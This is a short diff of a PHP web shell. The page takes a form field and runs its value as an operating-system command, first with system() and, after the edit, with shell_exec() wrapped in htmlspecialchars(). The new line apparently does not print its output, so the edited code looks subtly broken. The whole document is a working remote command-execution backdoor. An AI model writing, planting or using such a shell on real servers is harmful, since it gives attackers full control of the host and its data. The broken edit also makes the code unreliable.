@@ -53,7 +53,7 @@ Shell code here:<br><br><input type="text" name="myCommandmentIsThisDO_IT" autoc
 <pre>
 <?php
 if (isset($_POST['myCommandmentIsThisDO_IT'])) {
-system($_POST['myCommandmentIsThisDO_IT']);
+htmlspecialchars( shell_exec($_POST['myCommandmentIsThisDO_IT']) );
 }
 
 ?>
